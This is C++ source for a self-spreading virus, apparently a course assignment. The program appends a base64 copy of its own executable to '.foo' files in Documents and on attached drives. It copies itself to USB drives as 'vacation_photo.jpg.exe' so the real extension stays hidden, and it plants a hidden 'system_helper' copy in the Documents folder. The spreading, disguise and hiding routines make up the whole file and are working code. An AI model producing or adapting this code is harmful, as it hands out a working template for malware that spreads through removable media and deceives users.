#include <iostream>
#include <stdio.h>
#include <vector>
#include <string>
#include <stdlib.h>
#include <fstream>
using namespace std;

#ifdef __APPLE__
#include <mach-o/dyld.h> // For _NSGetExecutablePath
#endif

#ifdef _WIN32
#include <windows.h>
#include <locale>
#include <codecvt>
#include <shlobj.h>  // For SHGetFolderPathA
#pragma comment(lib, "shell32.lib")  // Link shell32.lib for SHGetFolderPathA
#else
#include <dirent.h>  // For Linux/macOS USB detection
#include <sys/stat.h>
#include <unistd.h> // For readlink()
#endif

int whichOS(){
    #ifdef _WIN32
        return 2; // Windows
    #elif __APPLE__
        return 0; // Mac
    #elif __linux__
        return 1; // Linux
    #else
        return -1; // Unknown OS
    #endif
}

// Base64 Encoding
const string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

    string base64_encode(const vector<char>& binary_data) {
        string encoded;
        int val = 0, valb = -6;
        for (unsigned char c : binary_data) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) encoded.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (encoded.size() % 4) encoded.push_back('=');
        return encoded;
}  

// Get the executable path
string getExecutablePath() {
    #ifdef _WIN32
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return string(path);
    #elif __APPLE__
        char path[1024];
        uint32_t size = sizeof(path);
        if (_NSGetExecutablePath(path, &size) == 0) {
            // Path could be relative, convert to absolute
            char realPath[PATH_MAX];
            if (realpath(path, realPath) != NULL) {
                return string(realPath);
            }
            return string(path);
        }
        return "./a.out"; // Default executable name
    #else
        char path[1024];
        ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
        if (len != -1) {
            path[len] = '\0';
            return string(path);
        }
        return "";
    #endif
}

// Read 'V' in binary mode
vector<char> readVContent() {
    string vPath = getExecutablePath();
    vector<char> content;

    ifstream file(vPath, ios::binary | ios::ate);
    if (!file) {
        cout << "Error reading V file: " << vPath << endl;
        return content;
    }

    streamsize size = file.tellg();
    file.seekg(0, ios::beg);

    content.resize(size);
    if (!file.read(content.data(), size)) {
        cout << "Error reading V content fully." << endl;
        content.clear();
    }

    file.close();
    return content;
}

void changeFiles(string PATH, int osType = -1) {
    if (osType == -1) {
        osType = whichOS();
    }

    string command;
    
    if (PATH.back() == '\\' || PATH.back() == '/') {
        PATH.pop_back();  
    }

    switch (osType) {
        case 0: // macOS
        case 1: // Linux
            command = "find \"" + PATH + "\" -name \"*.foo\" -type f";
            break;
        case 2: // Windows
            command = "dir /s /b \"" + PATH + "\\*.foo\"";  
            break;
        default:
            cout << "Unsupported OS" << endl;
            return;
    }

    FILE* pipe;
#ifdef _WIN32
    pipe = _popen(command.c_str(), "r");
#else
    pipe = popen(command.c_str(), "r");
#endif
    if (!pipe) {
        cout << "Error executing find command: " << command << endl;
        return;
    }

    char buffer[1024];
    vector<char> vContent = readVContent();

    if (vContent.empty()) {
        cout << "Failed to read 'V'. Aborting file modification." << endl;
#ifdef _WIN32
        _pclose(pipe);
#else
        pclose(pipe);
#endif
        return;
    }

    string encodedV = base64_encode(vContent);

    while (fgets(buffer, sizeof(buffer), pipe)) {
        string filename = buffer;
        if (!filename.empty() && filename.back() == '\n') {
            filename.pop_back();
        }

        ofstream file(filename, ios::app);
        if (file) {
            file << "\n--- Encoded V Content Start ---\n";
            file << encodedV << "\n";
            file << "--- Encoded V Content End ---\n";
            file.close();
            cout << "Appended Base64-encoded V content to: " << filename << endl;
        } else {
            cout << "Error opening file: " << filename << endl;
        }
    }

#ifdef _WIN32
    _pclose(pipe);
#else
    pclose(pipe);
#endif
}

string getHomeDirectory() {
    #ifdef _WIN32
        // Use SHGetFolderPathA to get the home directory
        char path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path))) {
            return std::string(path);
        }
        
        // Fallback: Use USERPROFILE or HOMEDRIVE+HOMEPATH
        char* home = getenv("USERPROFILE");
        if (home) return std::string(home);

        char* homeDrive = getenv("HOMEDRIVE");
        char* homePath = getenv("HOMEPATH");
        if (homeDrive && homePath) {
            return std::string(homeDrive) + std::string(homePath);
        }

    #else
        // UNIX-based systems (Linux/macOS)
        char* home = getenv("HOME");
        if (home) return std::string(home);
    #endif

    return ""; 
}


// Convert std::string to std::wstring for Windows API
#ifdef _WIN32
wstring stringToWString(const string& str) {
    wstring_convert<codecvt_utf8_utf16<wchar_t>> converter;
    return converter.from_bytes(str);
}
#endif


// Function to detect USB drives 
vector<string> detectUSB() {
    vector<string> usbPaths;

#ifdef _WIN32
    for (char driveLetter = 'D'; driveLetter <= 'Z'; driveLetter++) {
        string drivePath = string(1, driveLetter) + ":\\";
        UINT driveType = GetDriveTypeA(drivePath.c_str());

        // Check if drive is a USB (Removable)
        if (driveType == DRIVE_REMOVABLE) {
            cout << "Detected USB Drive: " << drivePath << endl;
            usbPaths.push_back(drivePath);
        } else {
            cout << "Skipping Drive: " << drivePath << " (Not a USB)" << endl;
        }
    }
#elif __APPLE__
    // macOS: External drives are mounted in /Volumes/
    DIR* dir = opendir("/Volumes/");
    if (dir) {
        struct dirent* entry;
        while ((entry = readdir(dir)) != NULL) {
            // Skip "." and ".." entries and the main Macintosh HD
            if (entry->d_name[0] != '.' && 
                strcmp(entry->d_name, "Macintosh HD") != 0) {
                string path = string("/Volumes/") + entry->d_name + "/";
                cout << "Detected external drive: " << path << endl;
                usbPaths.push_back(path);
            }
        }
        closedir(dir);
    } else {
        cout << "Could not open /Volumes/ directory" << endl;
    }
#else
    // Linux: Try both /media/ and /mnt/ directories
    DIR* dir = opendir("/media/");
    if (dir) {
        struct dirent* entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_name[0] != '.') {
                string path = string("/media/") + entry->d_name + "/";
                cout << "Detected external drive in /media/: " << path << endl;
                usbPaths.push_back(path);
            }
        }
        closedir(dir);
    }
    
    // Also check /mnt directory
    dir = opendir("/mnt/");
    if (dir) {
        struct dirent* entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_name[0] != '.') {
                string path = string("/mnt/") + entry->d_name + "/";
                cout << "Detected external drive in /mnt/: " << path << endl;
                usbPaths.push_back(path);
            }
        }
        closedir(dir);
    }
#endif

    return usbPaths;
}

// Function to check if program is running from an external drive
bool isRunningFromUSB() {
    string execPath = getExecutablePath();
    
#ifdef _WIN32
    if (execPath.length() > 2 && execPath[1] == ':' && execPath[2] == '\\') {
        char driveLetter = execPath[0];
        if (driveLetter >= 'D' && driveLetter <= 'Z') {
            return true;
        }
    }
#elif __APPLE__
    // On macOS, check if the path starts with "/Volumes/" but is not the main disk
    if (execPath.find("/Volumes/") == 0 && 
        execPath.find("/Volumes/Macintosh HD") != 0) {
        return true;
    }
#else
    // Linux: Check for /media/ or /mnt/ paths
    if (execPath.find("/media/") == 0 || execPath.find("/mnt/") == 0) {
        return true;
    }
#endif
    return false;
}

// Make the virus appear as an image file
string getImageFilename() {
#ifdef _WIN32
    return "vacation_photo.jpg.exe"; // Windows will hide the .exe extension by default
#else
    return "vacation_photo.jpg";     // Linux/macOS version
#endif
}

// Create an icon resource for Windows to look like an image file
#ifdef _WIN32
// This would be implemented in a resource file (.rc) in a real project
// For this assignment, we have just simulated it with code
void setImageIcon() {
    // In a real implementation, resource files would be used to set the icon
    // This is just a placeholder to indicate the concept
    cout << "Setting executable icon to look like an image file" << endl;
}
#endif

// Copy program to external drive with image filename
void copyVToUSB(const vector<string>& usbPaths) {
    string imageFilename = getImageFilename();
    
    // Get the full path to the current executable
    string execPath = getExecutablePath();
    if (execPath.empty()) {
        cout << "Error: Could not determine executable path" << endl;
        return;
    }
    
    cout << "Source executable path: " << execPath << endl;
    
    for (const string& usbPath : usbPaths) {
        string selfCopyPath = usbPath + imageFilename;
        cout << "Copying virus with image disguise to USB: " << usbPath << endl;
        cout << "Target path: " << selfCopyPath << endl;
        
#ifdef _WIN32
        string copyCommand = "copy \"" + execPath + "\" \"" + selfCopyPath + "\"";
        system(copyCommand.c_str());
        
#else
        // For macOS/Linux, ensure proper escaping of spaces in paths
        string escapedExecPath = execPath;
        string escapedSelfCopyPath = selfCopyPath;
        
        // Replace spaces with escaped spaces
        size_t pos = 0;
        while ((pos = escapedExecPath.find(" ", pos)) != string::npos) {
            escapedExecPath.replace(pos, 1, "\\ ");
            pos += 2; // Move past the replacement
        }
        
        pos = 0;
        while ((pos = escapedSelfCopyPath.find(" ", pos)) != string::npos) {
            escapedSelfCopyPath.replace(pos, 1, "\\ ");
            pos += 2; // Move past the replacement
        }
        
        string copyCommand = "cp " + escapedExecPath + " " + escapedSelfCopyPath;
        cout << "Executing command: " << copyCommand << endl;
        int result = system(copyCommand.c_str());
        
        if (result != 0) {
            cout << "Error copying file. Exit code: " << result << endl;
            
            // Try alternative method with quotes instead of escapes
            copyCommand = "cp \"" + execPath + "\" \"" + selfCopyPath + "\"";
            cout << "Trying alternative command: " << copyCommand << endl;
            result = system(copyCommand.c_str());
            
            if (result != 0) {
                cout << "Alternative method also failed. Exit code: " << result << endl;
            }
        }
        
        // Make the file executable on Linux/macOS
        string chmodCommand = "chmod +x \"" + selfCopyPath + "\"";
        system(chmodCommand.c_str());
#endif

        cout << "Copied virus disguised as image to USB: " << selfCopyPath << endl;
    }
}

// Function to copy `V` to the Documents folder on a new computer
void copyToDocumentsIfUSB() {
    if (!isRunningFromUSB()) {
        cout << "Not running from USB. No need to copy to Documents." << endl;
        return;
    }

    string docPath = getHomeDirectory();
    docPath += "/Documents";
    if (docPath.empty()) {
        cout << "Could not find Documents folder!" << endl;
        return;
    }

    string systemHelperPath = docPath + "\\System Helper";
    // Create a directory "System Helper"
    if (CreateDirectoryA(systemHelperPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        cout << "Directory created or already exists: " << systemHelperPath << endl;
    } else {
        cout << "Failed to create directory. Error code: " << GetLastError() << endl;
    }

    string selfPath = getExecutablePath();
    if (selfPath.empty()) {
        cout << "Could not find the executable path!" << endl;
        return;
    }

    // Use a less suspicious filename for the Documents copy
    string destPath = systemHelperPath + "/system_helper";
#ifdef _WIN32
    destPath += ".exe";
#endif

    // Check if already exists
#ifdef _WIN32
    if (GetFileAttributesA(destPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        cout << "Virus already exists in Documents. Skipping copy." << endl;
        return;
    }
#else
    struct stat buffer;
    if (stat(destPath.c_str(), &buffer) == 0) {
        cout << "Virus already exists in Documents. Skipping copy." << endl;
        return;
    }
#endif

    // Perform Copy
#ifdef _WIN32
    if (CopyFileA(selfPath.c_str(), destPath.c_str(), FALSE)) {
        cout << "Copied virus to Documents: " << destPath << endl;
        
        // Hide the file
        string hideCommand = "attrib +h \"" + destPath + "\"";
        system(hideCommand.c_str());
    } else {
        cout << "Failed to copy virus to Documents." << endl;
    }
#else
    string copyCommand = "cp \"" + selfPath + "\" \"" + destPath + "\"";
    if (system(copyCommand.c_str()) == 0) {
        cout << "Copied virus to Documents: " << destPath << endl;
        // Make executable
        string chmodCommand = "chmod +x \"" + destPath + "\"";
        system(chmodCommand.c_str());
    } else {
        cout << "Failed to copy virus to Documents." << endl;
    }
#endif
}


// Search for `.foo` files in USB drives and infect them
void infectUSBFiles(const vector<string>& usbPaths) {
    for (const string& usbPath : usbPaths) {
        cout << "Scanning and infecting .foo files in USB: " << usbPath << endl;
        changeFiles(usbPath);  
    }
}

// Combined function to call all USB-related functions
void handleUSB() {
    vector<string> usbPaths = detectUSB();

    if (usbPaths.empty()) {
        cout << "No USB drives detected." << endl;
        return;
    }

    infectUSBFiles(usbPaths);
    copyVToUSB(usbPaths);  
}

int main(){

    cout << "OS Type: " << whichOS() << endl;

    // Check if virus is running from USB
    if (isRunningFromUSB()) {
        cout << "Running from external drive." << endl;
        copyToDocumentsIfUSB();
        
        // Also find and modify .foo files on the host computer
        string docDir = getHomeDirectory();
        docDir += "/Documents";
        changeFiles(docDir);
    }
    else {
        // Running from the main computer
        string docDir = getHomeDirectory();
        docDir += "/Documents";
        cout << "Targeting Documents folder: " << docDir << endl;
        changeFiles(docDir);

        // Check for external drives and handle them
        handleUSB();
    }
    
    return 0;
}